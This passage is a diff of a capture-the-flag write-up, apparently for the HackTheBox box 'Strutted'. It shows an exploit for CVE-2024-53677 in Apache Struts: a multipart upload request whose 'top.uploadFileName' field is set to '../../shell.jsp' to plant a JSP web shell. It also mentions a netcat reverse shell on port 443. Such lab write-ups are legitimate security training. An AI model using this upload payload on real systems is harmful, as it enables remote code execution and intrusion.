@@ -45,7 +45,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
 ```
 
-Well, after the scan, I will give a brief summary of what you will have to do. Basically, you need to upload a PNG or GIF image (preferably) and intercept traffic with Burp Suite on `127.0.0.1 8080`. Then, send it to repeater on BurpSuite and add a script that will create a shell;
+Well, after the scan, I will give a brief summary of what you will have to do. Basically, you need to upload a PNG or GIF image (preferably) and intercept traffic with Burp Suite on `127.0.0.1 8080`. Then, send it to repeater on BurpSuite and add a script that will create a shell 
+
+(CVE-2024-53677 Manual Script):
 ```bash
 ------WebKitFormBoundaryApuxGnsr1KZey6yQ
 Content-Disposition: form-data; name="Upload"; filename="naowa.gif"
@@ -78,7 +80,7 @@ Content-Disposition: form-data; name="top.uploadFileName"
 ../../shell.jsp
 ------WebKitFormBoundaryApuxGnsr1KZey6yQ--
 ```
-I set mine up like this: "../../shell.jsp",You just need to enter the URL like this: http://strutted.htb/shell.jsp
+I set mine up like this: "../../shell.jsp",You just need to enter the URL like this `http://strutted.htb/shell.jsp`
 
 Afterward, you'll need to create a bash script (".sh") in the "/dev/shm/" directory to perform a reverse shell in netcat on port 443.
 
